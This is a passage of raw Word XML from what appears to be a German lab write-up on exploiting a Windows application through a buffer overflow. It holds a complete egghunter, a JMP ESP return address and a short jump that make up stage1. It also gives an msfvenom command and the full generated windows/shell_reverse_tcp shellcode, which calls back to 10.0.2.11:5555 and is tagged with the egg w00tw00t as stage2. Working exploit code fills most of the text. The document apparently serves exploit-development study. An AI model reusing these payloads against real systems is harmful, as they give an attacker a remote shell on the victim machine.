              <w:t># egghunter with tag w00t 32 byte</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34437621" w14:textId="77777777" w:rsidR="0018600A" w:rsidRPr="00B47CB9" w:rsidRDefault="0018600A" w:rsidP="0018600A">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>egghunter = b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B17AC74" w14:textId="77777777" w:rsidR="0018600A" w:rsidRPr="00B47CB9" w:rsidRDefault="0018600A" w:rsidP="0018600A">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>#jmp esp 77F1E684</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="763F9728" w14:textId="77777777" w:rsidR="0018600A" w:rsidRPr="00B47CB9" w:rsidRDefault="0018600A" w:rsidP="0018600A">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>eip = b'\x84\xE6\xF1\x77'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0096E281" w14:textId="77777777" w:rsidR="0018600A" w:rsidRPr="000700A3" w:rsidRDefault="0018600A" w:rsidP="0018600A">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#short jump -44 byte</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="377C23D7" w14:textId="77777777" w:rsidR="0018600A" w:rsidRPr="000700A3" w:rsidRDefault="0018600A" w:rsidP="0018600A">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>jmpBack = b'\xEB\xD4'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="444EE3C3" w14:textId="3077B2B1" w:rsidR="00226A59" w:rsidRPr="000700A3" w:rsidRDefault="0018600A" w:rsidP="0018600A">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>stage1 = b'\x90'*4 + egghunter + b'\x90'*4 + eip + jmpBack</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0BD0EF92" w14:textId="3C5F2076" w:rsidR="0018600A" w:rsidRPr="000700A3" w:rsidRDefault="0018600A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="286D15F8" w14:textId="4E99E626" w:rsidR="00457C41" w:rsidRPr="00B47CB9" w:rsidRDefault="001D349A" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00D53022" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ie Zeichenkette wurde an die Anwendung gesendet und ein Breakpoint beim Short Jump eingebaut. </w:t>
      </w:r>
      <w:r w:rsidR="00785A98" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Anschließend wurde d</w:t>
      </w:r>
      <w:r w:rsidR="005800CD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">er nächste Schritt in Immunity fortgesetzt und </w:t>
      </w:r>
      <w:r w:rsidR="007E1D47" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>verglichen</w:t>
      </w:r>
      <w:r w:rsidR="00532FD4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, ob die </w:t>
      </w:r>
      <w:r w:rsidR="007E1D47" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Zeichen richtig interpretiert werden</w:t>
      </w:r>
      <w:r w:rsidR="00087FD4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F88E48" w14:textId="345A9A1D" w:rsidR="00785A98" w:rsidRPr="00B47CB9" w:rsidRDefault="00785A98" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="28AA2ABE" wp14:editId="233694B7">
            <wp:extent cx="2943225" cy="1428750"/>
            <wp:effectExtent l="0" t="0" r="9525" b="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943225" cy="1428750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="551F262E" w14:textId="0B57868B" w:rsidR="00087FD4" w:rsidRPr="00B47CB9" w:rsidRDefault="00087FD4" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Dies ist der Fall, daher konnten keine außergewöhnlichen Badchars festgestellt werden. Man hätte hier auch sämtliche Opcodes (x00 – x9F) hineinkopieren und durchgehen können, darauf wurde jedoch verzichtet</w:t>
      </w:r>
      <w:r w:rsidR="00E2164D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D12FE7" w14:textId="6F278D9A" w:rsidR="00E2164D" w:rsidRPr="00B47CB9" w:rsidRDefault="00E2164D" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B70413C" w14:textId="78420346" w:rsidR="00E2164D" w:rsidRPr="00B47CB9" w:rsidRDefault="002C1254" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der Code für die Reverse</w:t>
      </w:r>
      <w:r w:rsidR="00F73161" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> TCP</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Shell wurde mithilfe von </w:t>
      </w:r>
      <w:r w:rsidR="00F919AB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">folgendem Befehl erstellt, </w:t>
      </w:r>
      <w:r w:rsidR="006A23D9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>das Standardencoding wurde nicht verändert</w:t>
      </w:r>
      <w:r w:rsidR="00F919AB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="006A23D9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72474288" w14:textId="77777777" w:rsidR="00F919AB" w:rsidRPr="00B47CB9" w:rsidRDefault="00F919AB" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59FD1291" w14:textId="2F2E2532" w:rsidR="002C1254" w:rsidRPr="000700A3" w:rsidRDefault="002C1254" w:rsidP="00F919AB">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000700A3">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.1</w:t>
      </w:r>
      <w:r w:rsidR="00213EC3">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="000700A3">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> LPORT=5555 -a x86 -f python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BAB2032" w14:textId="2C8EF384" w:rsidR="00F919AB" w:rsidRPr="000700A3" w:rsidRDefault="00F919AB" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00F73161" w:rsidRPr="00866A18" w14:paraId="0E2ABB6A" w14:textId="77777777" w:rsidTr="00F73161">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5FA9E09D" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell =  b""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="131ABF01" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="041E4649" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="187B057C" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="428E2AE8" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6310DD59" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19087BB9" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="757F1A42" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="281F3CB4" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5168A06E" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35DF6A0A" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56F3BF73" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="600472FF" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25BC80C6" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BA4E121" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F5D877B" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x00\x02\x0b\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12234105" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x02\x00\x15\xb3\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D820D4B" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3144E418" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AEF2B49" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="045C5CB3" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="665CF5F3" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="00B47CB9" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>shell += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17544A97" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="00B47CB9" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>shell += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17BE3822" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="00B47CB9" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>shell += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="777C2972" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DBFCC7F" w14:textId="77777777" w:rsidR="00F73161" w:rsidRPr="000700A3" w:rsidRDefault="00F73161" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76D3DA5B" w14:textId="77777777" w:rsidR="00613561" w:rsidRPr="000700A3" w:rsidRDefault="00613561" w:rsidP="00F73161">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2F711373" w14:textId="77777777" w:rsidR="00613561" w:rsidRPr="000700A3" w:rsidRDefault="00613561" w:rsidP="00613561">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>egg = b'w00tw00t'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12883375" w14:textId="2003F31A" w:rsidR="00613561" w:rsidRPr="000700A3" w:rsidRDefault="00613561" w:rsidP="00613561">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>stage2 = egg + shell</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0320D7F0" w14:textId="7A8D3833" w:rsidR="00F919AB" w:rsidRPr="000700A3" w:rsidRDefault="00F919AB" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16B1EDE6" w14:textId="3E98B82E" w:rsidR="00F73161" w:rsidRPr="00B47CB9" w:rsidRDefault="00F73161" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Anschlie</w:t>
      </w:r>
      <w:r w:rsidR="00613561" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ßend wurde </w:t>
      </w:r>
      <w:r w:rsidR="005841F0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eine Variable ‚stage2’ erstellt. Vor dem Shellcode wurde das Egg (w00tw00t) </w:t>
      </w:r>
      <w:r w:rsidR="00361003" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">eingefügt, damit der Shellcode vom Egghunter gefunden werden kann. </w:t>
      </w:r>
      <w:r w:rsidR="00EB69C4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Zeichenkette wurde </w:t>
      </w:r>
      <w:r w:rsidR="009C4F98" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">sowohl </w:t>
      </w:r>
      <w:r w:rsidR="00C33044" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dem Message Name und Body übergeben. Hier wäre eine Übergabe in eine</w:t>
      </w:r>
      <w:r w:rsidR="004B07E0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00C33044" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> der beiden </w:t>
      </w:r>
      <w:r w:rsidR="006D58DE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Parameter vollkommen ausreichend gewesen. D</w:t>
      </w:r>
      <w:r w:rsidR="005477E1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">as Übertragen des Eggs + Shellcodes wurde vorm </w:t>
      </w:r>
      <w:r w:rsidR="001E7754" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dem Senden</w:t>
      </w:r>
      <w:r w:rsidR="00C514D6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
